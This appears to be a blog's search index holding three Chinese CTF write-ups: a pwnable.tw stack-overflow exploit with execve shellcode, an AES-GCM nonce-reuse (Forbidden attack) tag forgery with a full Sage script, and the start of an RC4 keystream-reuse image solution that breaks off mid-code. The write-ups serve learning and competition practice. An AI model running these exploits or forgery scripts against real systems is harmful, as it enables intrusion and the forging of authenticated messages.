<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwnable.tw start</title>
      <link href="/2020/10/11/start/"/>
      <url>/2020/10/11/start/</url>
      
        <content type="html"><![CDATA[<p>IDA无法反编译，只能看汇编，好在逻辑不复杂，简单来说就是一个write和一个read函数调用。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:08048060                 push    esp</span><br><span class="line">.text:08048061                 push    offset _exit</span><br><span class="line">.text:08048066                 xor     eax, eax</span><br><span class="line">.text:08048068                 xor     ebx, ebx</span><br><span class="line">.text:0804806A                 xor     ecx, ecx</span><br><span class="line">.text:0804806C                 xor     edx, edx</span><br><span class="line">.text:0804806E                 push    3A465443h</span><br><span class="line">.text:08048073                 push    20656874h</span><br><span class="line">.text:08048078                 push    20747261h</span><br><span class="line">.text:0804807D                 push    74732073h</span><br><span class="line">.text:08048082                 push    2774654Ch</span><br><span class="line">.text:08048087                 mov     ecx, esp        ; addr</span><br><span class="line">.text:08048089                 mov     dl, 14h         ; len</span><br><span class="line">.text:0804808B                 mov     bl, 1           ; fd</span><br><span class="line">.text:0804808D                 mov     al, 4</span><br><span class="line">.text:0804808F                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:08048091                 xor     ebx, ebx</span><br><span class="line">.text:08048093                 mov     dl, 3Ch</span><br><span class="line">.text:08048095                 mov     al, 3</span><br><span class="line">.text:08048097                 int     80h             ; LINUX -</span><br><span class="line">.text:08048099                 add     esp, 14h</span><br><span class="line">.text:0804809C                 retn</span><br></pre></td></tr></table></figure><p>翻译为C代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    buf[<span class="number">20</span>]=<span class="string">"Let's start the CTF:"</span>;</span><br><span class="line">    sys_write(<span class="number">1</span>,buf,<span class="number">20</span>);</span><br><span class="line">    sys_read(<span class="number">0</span>,buf,<span class="number">60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显存在栈溢出，而且程序没有开NX保护，直接使用shellcode，接下来就是如何布置shellcode以及获取栈地址信息的过程了。</p><p>这里需要了解一下Linux System Call 的调用规范：调用号放置在 <code>eax</code> 中，参数依次放入 <code>ebx</code>、<code>ecx</code>、<code>edx</code> 等寄存器中，之后 <code>int 80</code> 执行调用，返回值会放入到 <code>eax</code> 中。 因此这里为了获取栈地址，我们只能使用程序自带的write逻辑，因为需要把ecx设置为指向与栈地址相关的指针，这里实际上刚好在程序执行到retn的时候，esp指向的就是esp。因此我们只需要将ret address改为08048087，就能将ecx赋值为esp，然后通过write就能获取esp。之后二次read读取shellcode进行执行。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">SHELLCODE = <span class="string">'''</span></span><br><span class="line"><span class="string">xor    eax,eax</span></span><br><span class="line"><span class="string">push   eax</span></span><br><span class="line"><span class="string">push   0x68732f2f</span></span><br><span class="line"><span class="string">push   0x6e69622f</span></span><br><span class="line"><span class="string">mov    ebx,esp</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">xor    edx,edx</span></span><br><span class="line"><span class="string">mov    al,0xb</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./start"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x8048087")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">esp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"esp:"</span>, hex(esp)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">shellcode = asm(SHELLCODE)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">20</span> + p32(esp + <span class="number">20</span>) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 第五空间 UnSafeAES Forbidden Attack</title>
      <link href="/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/"/>
      <url>/2020/07/12/2020-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-UnSafeAES-Forbidden%20Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​    这次第五空间比赛中的密码学比较难，除了一道签到的都没做出来，还是太菜了orz</p><p>​    比赛快结束的时候队内大佬找到了UnSafeAES这道题目的攻击方法，但由于时间原因来不及复现，只好在赛后复现一下，发现这道题还是比较有意思的，因此想分享一下。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>​    这道题的攻击方法叫Forbidden Attack，事实上就是resused nonce attack，下面简单介绍一下。</p><h3 id="推导Authentication-Tag的多项式"><a href="#推导Authentication-Tag的多项式" class="headerlink" title="推导Authentication Tag的多项式"></a>推导Authentication Tag的多项式</h3><p>​    在AES-GCM加密模式中，Authentication Tag是通过有限域GF(2^128)进行一些列乘法所产生的，因此其最终结果可以用多项式来表示。下面将举例说明其多项式的表达式。</p><p><strong>场景一</strong>：假设Alice想利用AES-GCM加密16字节长的明文（plaintext）并使用16字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p><blockquote><p>$g(X) = ((A_1X + C_1)X + L)X + S$</p></blockquote><p>等价于</p><blockquote><p>$g(X) = A_1X^3 + C_1X^2 + LX + S$</p></blockquote><p>其中$A_1$即为相关消息，$C_1$ 为加密明文所产生的密文，$L$ 等于 len(A) || len(C) ，$S$为$E_k(nonce+1)$，当$X=H$时有$g(H) = T$，这里$H$为认证密钥，$T$为认证标签。</p><p><strong>场景二：</strong>假设Alice想利用AES-GCM加密32字节长的明文（plaintext）并使用32字节的相关消息（associated data）来产生相对应的认证标签。因此认证标签的计算结果将为：</p><blockquote><p>$g(X) = ((((A_1X + A_2)X + C_1)X + C_2)X + L)X + S$</p></blockquote><p>等价于</p><blockquote><p>$g(X) = A_1X^5 + A_2X^4 + C_1X^3 + C_2X^2 + LX + S$</p></blockquote><p><strong>推广：</strong>从场景一以及场景二中，我们可以很容易的推导出产生Authentication Tag的通项式：</p><blockquote><p>$g(X) = A_1X^{m+n+1} + … + A_mX^{n+2} + C_1X^{n+1} + … + C_nX^2 + LX + S$</p></blockquote><h3 id="The-Forbidden-Attack"><a href="#The-Forbidden-Attack" class="headerlink" title="The Forbidden Attack"></a>The Forbidden Attack</h3><p>​    仍举例分析，为了简化考虑，我们假设Alice发送两次消息，两次消息的内容不同，但是均少于16字节，其中加密的结果分别记为$C_{1,1}$,$C_{2,1}$。同时用于计算认证标签的相关消息也均少于16字节，分别记为$A_{1,1}$,$A_{2,1}$。<strong>最重要的是</strong>，两次加密所使用的nonce相同。因此，我们可以得到以下两个式子：</p><blockquote><p>$g1(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S$</p><p>$g2(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S$</p></blockquote><p>注意以上的符号均为在有限域GF(2^128)下的多项式表达式，同时不足16字节的部分需要填充，$L_1$和$L_2$根据密文长度和相关消息长度得出。</p><p>​    作为攻击者，我们已知的信息有$C_{1,1}$,$C_{2,1}$,$A_{1,1}$,$A_{2,1}$,$L_1$,$L_2$，而$S$和$X$我们均未知，因此无法直接伪造签名。但是我们可以通过消除S使得未知数的个数减为一个并令多项式等于0，我们就可以通过求解一元三次方程获取到$X$的值。具体做法如下：</p><p>首先我们知道$g1(H) = T_1$，$g2(H) = T_2$。那么我们构造：</p><blockquote><p>$g1^{‘}(X) = A_{1,1}X^3 + C_{1,1}X^2 + L_1X + S + T_1$</p><p>$g2^{‘}(X) = A_{2,1}X^3 + C_{2,1}X^2 + L_2X + S + T_2$</p></blockquote><p>并且有$g1^{‘}(H) = 0$，$g2^{‘}(H) = 0$。然后我们计算$g1’(X) + g2’(X)$，记为$f(X)$，如下：</p><blockquote><p>$f(X) = (A_{1,1}+A_{2,1})X^3 + (C_{1,1}+C_{2,1})X^2 + (L_1+L_2)X + T_1 + T_2$</p></blockquote><p><strong>注意：</strong>有限域中多项式的加法运算等同异或。</p><p>我们成功的将$S$从表达式去消去了！然后我们又有$f(H) = 0$，因此我们可以简单的算出所有可能的$H$，并轻松的伪造签名，达到攻击的目的。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>​    有了以上的知识贮备后，接下来就是实战的环节了。在看完The Forbidden Attack的描述，我们知道为了达成伪造签名的目标，我们必须使得加密所使用的nonce相同并获取其加密结果。但在UnSafeAES这道题中中，似乎nonce无法被我们直接控制，而且加密前会检查该nonce是否已经使用过，因此如何让服务端使用相同的nonce进行加密不那么容易。</p><p>​    首先为了让服务端使用相同的nonce进行加密，我们可以对nonce进行00填充，因为我们注意到服务端在解析我们的输入时，不会检查nonce的长度，因此我们可以传输字符串不同，但是转为数字后相同的nonce。例如<code>nonce1 = &#39;\x00&#39;+ &#39;A&#39;*11</code>, <code>nonce2 = &#39;A&#39;*11</code>，尽管<code>nonce1 != nonce2</code>，但是<code>bytes_to_long(nonce1) == bytes_to_long(nonce2)</code>，因此我们可以通过这种方法来绕过检查。但是我们无法直接发送带00填充的nonce，因为服务端在解析输入后会首先进行解密，其中就包括验证部分，假如验证失败，就会退出。但是细心的朋友肯定已经注意到题目代码中的不寻常之处，在client函数中有以下代码片段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client</span><span class="params">(data)</span>:</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">b"ctf.server/test?message="</span> + ct</span><br><span class="line">        nonce = hashlib.sha256(url).digest()[:<span class="number">12</span>]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这里把nonce设置为sha256为计算的结果，因此我们控制sha256计算出的结果，使其带有00填充。由于后续我们需要多次加密，因此我控制sha256计算出的结果头部含有三个00填充，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line"><span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line">send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">print</span> m.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终我们可以得到<code>m.encode(&#39;hex&#39;) = &#39;9cd872&#39;</code></p><p>​    这样，当我们<strong>第一次发送数据</strong>时，我们可以发送<code>9cd87241414141414141414141414141414141414141414141414141</code>使得nonce的首三个字节均为<code>&#39;\x00&#39;</code>。然后我们获取到服务器第一次打印出的数据，记为client1，然后为了让程序接下来继续使用我们构造的nonce去加密，我们在<strong>第二次发送数据</strong>时发送将client1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时服务端解析后的nonce尽管和第一次nonce相比少了一个<code>&#39;\x00&#39;</code>，然而实质相同。然后我们获取到服务器打印出的数据，记为server1。在<strong>第三次发送数据</strong>时发送将server1中nonce部分的首字节删除（即删除一个<code>&#39;\x00&#39;</code>）后的字符串，此时的nonce尽管和前两次都不同，但是实质相同。然后再次获取到服务器打印的数据client2。到此我们已经获取到了client1，server1，client2。然后我们需要用client1，client2来计算认证密钥$H$。具体步骤如下：</p><p>​    首先我们获取到client1中的三块加密结果（分别16字节，16字节，4字节）以及client2中的三块加密结果，并将其转为多项式，分别记为$C_{1,1}$，$C_{1,2}$，$C_{1,3}$，$C_{2,1}$，$C_{2,2}$，$C_{2,3}$。注意$C_{1,3}$和$C_{2,3}$需要填充。同时获取到client1和client2中的tag部分，记为$T_1$，$T_2$，并计算$L_1$，$L_2$。同时记相关消息的多项式表达（<code>&quot;from client&quot;</code>）为$A$。然后我们就有：</p><blockquote><p>$g1’(X) = AX^5 + C_{1,1}X^4 + C_{1,2}X^3 + C_{1,3}X^2 + L_1X + S + T1$</p><p>$g2’(X) = AX^5 + C_{2,1}X^4 + C_{2,2}X^3 + C_{2,3}X^2 + L_1X + S + T1$</p><p>$f(X) = g1’(X) + g2’(X) = (C_{1,1}+C_{2,1})X^4 + (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + (L_1+L_2)X + T_1 + T_2$</p></blockquote><p>同时我们知道$C_{1,1} = C_{2,1}$，$L_1 = L_2$。因此可化简为：</p><blockquote><p>$f(X) = (C_{1,2}+C_{2,2})X^3 + (C_{1,3}+C_{2,3})X^2 + T_1 + T_2$</p></blockquote><p>根据$f(H) = 0$，我们可解出所有可能的解。然后篡改解密消息同时伪造签名，发送给服务端。具体过程如下：</p><p>首先利用字节翻转将client2中的消息进行篡改，使得解密后特定位置字符串为<code>&quot;flag&quot;</code>，然后伪造签名。为了伪造签名，我们需要计算出$S$，因为$g(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX + S$（其中$S$未知）。因此为了计算出$S$，我们构造函数$f2(X) = AX^5 + C_{1}X^4 + C_{2}X^3 + C_{3}X^2 + LX +T$, 那么我们就有$f2(H) + S = 0$，因此$S = f2(H)$，之后我们将$S$代入$g(X)$即可计算出相对应的签名。</p><p>​    我们记对client2中密文部分进行字节反转后的结果为c，伪造签名为t，对client2中的nonce部分的首字节删除后（删除<code>&#39;\x00&#39;</code>）的nonce结果为n，那么<strong>最后一次发送数据</strong>时我们将发送c+t+n。于是我们就能得到服务端打印出的对flag进行加密的结果，简单计算后发现len(flag) = 23，小于client1中的密文长度，因此直接对其进行字节翻转得到flag。</p><p>关键脚本部分如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(s)</span>:</span></span><br><span class="line">s = s + (<span class="number">16</span>-len(s))*<span class="string">"\x00"</span></span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'ctf.server/test?message='</span></span><br><span class="line">forge = <span class="string">'ctf.server/flag?message='</span></span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(range(<span class="number">256</span>), repeat=<span class="number">3</span>):</span><br><span class="line">m = <span class="string">''</span>.join(map(chr, comb))</span><br><span class="line">m = <span class="string">'9cd872'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">if</span> sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>].startswith(<span class="string">"\x00\x00\x00"</span>):</span><br><span class="line"><span class="keyword">print</span> (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">send = (m+<span class="string">"A"</span>*<span class="number">9</span>+<span class="string">"A"</span>*<span class="number">16</span>).encode(<span class="string">'hex'</span>)</span><br><span class="line">nonce = sha256(url+m+<span class="string">"A"</span>*<span class="number">9</span>).digest()[:<span class="number">12</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"nonce: "</span>+nonce.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"MITM: "</span>)</span><br><span class="line">p.sendline(send)</span><br><span class="line">client1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c1 = client1[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t1 = client1[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c1: "</span>+c1</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t1: "</span>+t1</span><br><span class="line"></span><br><span class="line">p.sendline(client1+nonce[<span class="number">1</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">server1 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">12</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">p.sendline(server1+nonce[<span class="number">2</span>:].encode(<span class="string">'hex'</span>))</span><br><span class="line">client2 = p.recvuntil(<span class="string">"MITM: "</span>)[:(<span class="number">36</span>+<span class="number">16</span>)*<span class="number">2</span>]</span><br><span class="line">c2 = client2[:<span class="number">36</span>*<span class="number">2</span>]</span><br><span class="line">t2 = client2[<span class="number">36</span>*<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"c2: "</span>+c2</span><br><span class="line"><span class="keyword">print</span> <span class="string">"t2: "</span>+t2</span><br><span class="line"></span><br><span class="line">c1_1 = c1[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_2 = c1[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c1_3 = padding(c1[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t1 = t1.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">c2_1 = c2[:<span class="number">32</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_2 = c2[<span class="number">32</span>:<span class="number">64</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">c2_3 = padding(c2[<span class="number">64</span>:<span class="number">64</span>+<span class="number">4</span>*<span class="number">2</span>].decode(<span class="string">'hex'</span>))</span><br><span class="line">t2 = t2.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (c1_2+c2_2) * X^3 + (c1_3+c2_3) * X^2 + t1 + t2 = 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_poly</span><span class="params">(block, a)</span>:</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">bits = bin(bytes_to_long(block))[<span class="number">2</span>:].zfill(<span class="number">128</span>)</span><br><span class="line"><span class="keyword">for</span> e, bit <span class="keyword">in</span> enumerate(bits):</span><br><span class="line">f += int(bit) * a**e</span><br><span class="line"><span class="keyword">return</span> f </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poly_to_bytes</span><span class="params">(poly)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, bit <span class="keyword">in</span> enumerate(poly._vector_()):</span><br><span class="line">        a |= int(bit) &lt;&lt; (<span class="number">127</span> - i)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(a)</span><br><span class="line"></span><br><span class="line">F, a = GF(<span class="number">2</span>**<span class="number">128</span>, name=<span class="string">"a"</span>).objgen()</span><br><span class="line">R, X = PolynomialRing(F, name=<span class="string">"X"</span>).objgen()</span><br><span class="line"></span><br><span class="line">C1_1 = bytes_to_poly(c1_1, a)</span><br><span class="line">C1_2 = bytes_to_poly(c1_2, a)</span><br><span class="line">C1_3 = bytes_to_poly(c1_3, a)</span><br><span class="line">T1 = bytes_to_poly(t1, a)</span><br><span class="line"></span><br><span class="line">C2_2 = bytes_to_poly(c2_2, a)</span><br><span class="line">C2_3 = bytes_to_poly(c2_3, a)</span><br><span class="line">T2 = bytes_to_poly(t2, a)</span><br><span class="line"></span><br><span class="line">len_aad = <span class="number">11</span></span><br><span class="line">len_txt = <span class="number">36</span></span><br><span class="line">L = long_to_bytes(((<span class="number">8</span> * len_aad) &lt;&lt; <span class="number">64</span>) | (<span class="number">8</span> * len_txt))</span><br><span class="line">L = bytes_to_poly(L, a)</span><br><span class="line">A = bytes_to_poly(padding(<span class="string">"from client"</span>), a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># f(x) = 0</span></span><br><span class="line">f = (C1_2+C2_2) * X**<span class="number">3</span> + (C1_3+C2_3) * X**<span class="number">2</span> + T1 + T2</span><br><span class="line"><span class="comment"># f1(X) = S</span></span><br><span class="line">f1 = A * X**<span class="number">5</span> + C1_1 * X**<span class="number">4</span> + C1_2 * X**<span class="number">3</span> + C1_3 * X**<span class="number">2</span> + L * X + T1</span><br><span class="line"></span><br><span class="line">G1 = bytes_to_poly(c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1_1[<span class="number">15</span>:], a)</span><br><span class="line">G2 = C1_2</span><br><span class="line">G3 = C1_3</span><br><span class="line"><span class="comment"># f2(X) + S = forge_tag</span></span><br><span class="line">f2 = A * X**<span class="number">5</span> + G1 * X**<span class="number">4</span> + G2 * X**<span class="number">3</span> + G3 * X**<span class="number">2</span> + L * X</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, _ <span class="keyword">in</span> f.roots():</span><br><span class="line"><span class="comment"># print root</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"H: "</span>+poly_to_bytes(root).encode(<span class="string">'hex'</span>)</span><br><span class="line">S = f1(root)</span><br><span class="line">forge_tag = poly_to_bytes(f2(root) + S)</span><br><span class="line">send = c1_1[:<span class="number">11</span>] + strxor(strxor(c1_1[<span class="number">11</span>:<span class="number">15</span>], <span class="string">"flag"</span>), <span class="string">"test"</span>) + c1[<span class="number">30</span>:].decode(<span class="string">'hex'</span>) + forge_tag + nonce[<span class="number">3</span>:]</span><br><span class="line">send = send.encode(<span class="string">'hex'</span>)</span><br><span class="line">p.sendline(send)</span><br><span class="line">flag = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag: "</span>+flag</span><br><span class="line">flag = flag[:-(<span class="number">9</span>+<span class="number">16</span>)*<span class="number">2</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">flag = strxor(strxor(flag, c1.decode(<span class="string">'hex'</span>)[:len(flag)]), url[:len(flag)])</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>完整代码详见<a href="https://github.com/zrax-x/CTF/blob/master/2020-5space/solve.py" target="_blank" rel="noopener">solve.py</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    尽管nonce重用攻击在以往的比赛中已经出现过，但是在这次比赛中的题目很好的加入了新的元素，在增加题目难度的同时也很好了保证了题目的质量。</p><p>参考链接</p><p><a href="https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden" target="_blank" rel="noopener">https://github.com/ashutosh1206/Crypton/tree/master/Authenticated-Encryption/AES-GCM/Attack-Forbidden</a> </p><p>文章转载自安全客<a href="https://www.anquanke.com/post/id/209203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209203</a> </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒五月赛BJD&amp;DAS</title>
      <link href="/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/"/>
      <url>/2020/05/26/%E5%AE%89%E6%81%92%E4%BA%94%E6%9C%88%E8%B5%9BBJD&amp;DAS/</url>
      
        <content type="html"><![CDATA[<h2 id="Encrypt-Img"><a href="#Encrypt-Img" class="headerlink" title="Encrypt_Img"></a>Encrypt_Img</h2><p>题目本身不难，比赛时没有注意到两次加密的是同一张图片，所以没有做出来。</p><p>做法比较简单，因为两个plaintext长度不等（这里是相差一个字节）。因此通过异或plaintext1和ciphertext1的最后一个字节我们可以得到RC4此时产生key，而两次加密时RC4所产生的密钥流显然是一样的，因此可以用这个key去解出图片的第一个像素点，记为p1。同时我们知道两张图片是相同的，因此通过p1和第一次加密的图片的第一个像素点，我们又可以拿到下一个key，用它来解密第二次加密时的第二个像素点，以此类推，最终解出整张图片。</p><p>赛后简单的写了下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 